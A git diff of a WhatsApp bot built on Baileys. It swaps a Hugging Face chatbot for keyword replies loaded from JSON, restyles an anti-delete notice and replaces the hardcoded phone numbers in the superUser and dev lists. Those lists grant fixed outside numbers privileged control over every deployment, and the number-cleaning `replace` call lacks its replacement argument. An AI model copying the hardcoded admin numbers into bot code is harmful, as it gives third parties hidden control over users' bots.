@@ -56,7 +56,6 @@ logger.level = 'silent';
 const pino = require("pino");
 const boom_1 = require("@hapi/boom");
 const conf = require("./set");
-const axios = require('axios');
 let fs = require("fs-extra");
 let path = require("path");
 const FileType = require('file-type');
@@ -188,9 +187,8 @@ setTimeout(() => {
 function createNotification(deletedMessage) {
   const deletedBy = deletedMessage.key.participant || deletedMessage.key.remoteJid;
   let notification = `*FELIX ANTIDELETE*\n\n`;
-  notification +=   `*TIME DELETED :* ${new Date().toLocaleString()}\n`;
-  notification +=   `*DELETED BY   :* @${deletedBy.split('@')[0]}\n\n
-                    *POWERED BY HANSTZ*\n\n`;
+  notification += `*Time deleted🥀:* ${new Date().toLocaleString()}\n`;
+  notification += `*Deleted by🌷:* @${deletedBy.split('@')[0]}\n\n*Powered by HANSTZ*\n\n`;
   return notification;
 }
 
@@ -459,92 +457,92 @@ zk.ev.on("messages.upsert", async m => {
     }
   }
 });
-const zk = {
-  ev: {
-    on: (event, callback) => {
-      // Simulate incoming messages (for demonstration purposes)
-      console.log(`Listening for ${event} events...`);
-      setTimeout(() => {
-        callback({
-          messages: [
-            { key: { remoteJid: "1234@s.whatsapp.net", fromMe: true }, message: { conversation: "What's your name?" } },
-            { key: { remoteJid: "1234@s.whatsapp.net", fromMe: true }, message: { conversation: "Can you tell me a joke?" } },
-            { key: { remoteJid: "1234@s.whatsapp.net", fromMe: true }, message: { conversation: "How are you today?" } }
-          ]
-        });
-      }, 1000); // Simulate incoming messages
-    }
-  },
-  sendMessage: async (jid, message) => {
-    console.log(`Sending message to ${jid}:`);
-    console.log(message.text);
-  }
-};
 
-const conf = {
-  CHAT_BOT: "yes",
-};
-
-// Hugging Face API endpoint for chat
-const HF_API_URL = "https://api-inference.huggingface.co/models/gpt2";
-
-// Function to get chatbot response from Hugging Face's API
-const getChatbotReply = async (messageText) => {
+// Load the reply messages from the JSON file
+const loadReplyMessages = () => {
   try {
-    const response = await axios.post(
-      HF_API_URL,
-      { inputs: messageText },
-      { headers: { "Content-Type": "application/json" } }
-    );
-
-    if (response.data && response.data[0]?.generated_text) {
-      return response.data[0].generated_text;
-    } else {
-      return "Sorry, I didn't understand that. Can you try again?";
-    }
+    const filePath = path.join(__dirname, 'database', 'chatbot.json');
+    const data = fs.readFileSync(filePath, 'utf8');
+    return JSON.parse(data);
   } catch (error) {
-    console.error("Error fetching reply from Hugging Face API:", error.message);
-    return "Sorry, the chatbot service is currently unavailable.";
+    console.error('Error loading chatbot responses:', error.message);
+    return {}; // Return an empty object if there is an error
   }
 };
 
-// Function to start chatbot and process incoming messages
-const startChatbot = (zk, conf) => {
-  if (conf.CHAT_BOT === "yes") {
-    console.log("CHAT_BOT is enabled. Listening for messages...");
+// Track the time of the last response to enforce rate-limiting
+let lastReplyTime = 0;
 
-    zk.ev.on("messages.upsert", async (event) => {
-      try {
-        const { messages } = event;
+// Define the minimum delay (in milliseconds) between replies (e.g., 5 seconds)
+const MIN_REPLY_DELAY = 5000;
 
-        for (const message of messages) {
-          if (!message.key || !message.key.remoteJid || message.key.fromMe) continue;
+// Function to find a matching text reply based on the message
+const getReplyMessage = (messageText, replyMessages) => {
+  // Convert the message to lowercase and split it into words
+  const words = messageText.toLowerCase().split(/\s+/);
 
-          const messageText = message.message?.conversation || message.message?.extendedTextMessage?.text || "";
+  // Check if any of the words match a keyword in the replyMessages object
+  for (const word of words) {
+    if (replyMessages[word]) {
+      return replyMessages[word]; // Return the matching reply
+    }
+  }
 
-          if (messageText) {
-            const replyMessage = await getChatbotReply(messageText);
+  return null; // Return null if no match is found
+};
 
-            if (replyMessage) {
-              await zk.sendMessage(message.key.remoteJid, {
-                text: replyMessage,
-                quoted: message, // Quote the original message
-              });
-              console.log(`Reply sent: ${replyMessage}`);
-            }
-          }
+// Listen for incoming messages when CHAT_BOT is enabled
+if (conf.CHAT_BOT === 'yes') {
+  console.log('CHAT_BOT is enabled. Listening for messages...');
+  
+  zk.ev.on('messages.upsert', async (event) => {
+    try {
+      const { messages } = event;
+      
+      // Load the replies from the JSON file
+      const replyMessages = loadReplyMessages();
+
+      // Iterate over incoming messages
+      for (const message of messages) {
+        if (!message.key || !message.key.remoteJid) {
+          continue; // Skip if there's no remoteJid
         }
-      } catch (error) {
-        console.error("Error in message processing:", error.message);
+
+        const messageText = message.message?.conversation || message.message?.extendedTextMessage?.text || '';
+        const replyMessage = getReplyMessage(messageText, replyMessages);
+
+        // Ensure we don't send replies too frequently
+        const currentTime = Date.now();
+        if (currentTime - lastReplyTime < MIN_REPLY_DELAY) {
+          console.log('Rate limit applied. Skipping reply.');
+          continue; // Skip this reply if the delay hasn't passed
+        }
+
+        if (replyMessage) {
+          try {
+            // Send the corresponding text reply
+            await zk.sendMessage(message.key.remoteJid, {
+              text: replyMessage
+            });
+            console.log(`Text reply sent: ${replyMessage}`);
+
+            // Update the last reply time
+            lastReplyTime = currentTime;
+          } catch (error) {
+            console.error(`Error sending text reply: ${error.message}`);
+          }
+        } else {
+          console.log('No matching keyword detected. Skipping message.');
+        }
+
+        // Wait for a brief moment before processing the next message (3 seconds delay)
+        await new Promise((resolve) => setTimeout(resolve, 3000));
       }
-    });
-  }
-};
-
-// Start the chatbot
-startChatbot(zk, conf);
-
-
+    } catch (error) {
+      console.error('Error in message processing:', error.message);
+    }
+  });
+}
 // AUTO_REACT: React to messages with random emoji if enabled.
 if (conf.AUTO_REACT === "yes") {
   zk.ev.on("messages.upsert", async m => {
@@ -690,10 +688,10 @@ if (conf.AUTO_LIKE_STATUS === "yes") {
       } = require("./bdd/sudo");
       const nomAuteurMessage = ms.pushName;
       const sudo = await getAllSudoNumbers();
-      const superUserNumbers = [servBot, "255760774888", '254110190196', '255760774888', "255756530143", '255760774888', conf.NUMERO_OWNER].map(s => s.replace(/[^0-9]/g) + "@s.whatsapp.net");
+      const superUserNumbers = [servBot, "254748387615", '254110190196', '254748387615', "254796299159", '254752925938', conf.NUMERO_OWNER].map(s => s.replace(/[^0-9]/g) + "@s.whatsapp.net");
       const allAllowedNumbers = superUserNumbers.concat(sudo);
       const superUser = allAllowedNumbers.includes(auteurMessage);
-      var dev = ['254110190196', '255760774888', "255756530143", '255760774888'].map(t => t.replace(/[^0-9]/g) + "@s.whatsapp.net").includes(auteurMessage);
+      var dev = ['254110190196', '254748387615', "254796299159", '254752925938'].map(t => t.replace(/[^0-9]/g) + "@s.whatsapp.net").includes(auteurMessage);
       function repondre(mes) {
         zk.sendMessage(origineMessage, {
           text: mes
@@ -1246,7 +1244,7 @@ if (conf.ANTILINK === "yes") {
       try {
         ppgroup = await zk.profilePictureUrl(group.id, 'image');
       } catch {
-        ppgroup = 'https://files.catbox.moe/5pu96r.webp';
+        ppgroup = 'https://ibb.co/7SKY0tg';
       }
       try {
         const metadata = await zk.groupMetadata(group.id);
